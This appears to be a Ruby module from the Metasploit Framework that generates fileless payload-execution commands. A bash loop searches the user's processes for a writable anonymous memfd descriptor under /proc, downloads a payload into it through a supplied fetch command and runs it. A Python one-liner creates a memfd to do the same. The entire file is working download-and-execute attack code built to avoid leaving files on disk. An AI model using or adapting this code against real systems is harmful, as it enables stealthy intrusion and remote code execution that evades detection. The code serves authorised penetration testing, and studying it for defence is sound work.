module Msf
  ###
  #
  # Common library for http fetch-based payloads
  #
  ###
  module Payload::Adapter::Fetch::Fileless
    # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
    def _generate_fileless(get_file_cmd)
      # get list of all $USER's processes
      cmd = 'FOUND=0'
      cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
      # already found anonymous file where we can write
      cmd << '; do if [ $FOUND -eq 0 ]'

      # look for every symbolic link with write rwx permissions
      # if found one, try to download payload into the anonymous file
      # and execute it
      cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
      cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
      cmd << "; then if $(#{get_file_cmd} >/dev/null)"
      cmd << '; then $f'
      cmd << '; FOUND=1'
      cmd << '; break'
      cmd << '; fi'
      cmd << '; fi'
      cmd << '; done'
      cmd << '; fi'
      cmd << '; done'

      cmd
    end

    # same idea as _generate_fileless function, but force creating anonymous file handle
    def _generate_fileless_python(get_file_cmd)
      %<python3 -c 'import os;fd=os.memfd_create("",os.MFD_CLOEXEC);os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";#{get_file_cmd};$f&")'>
    end
  end
end
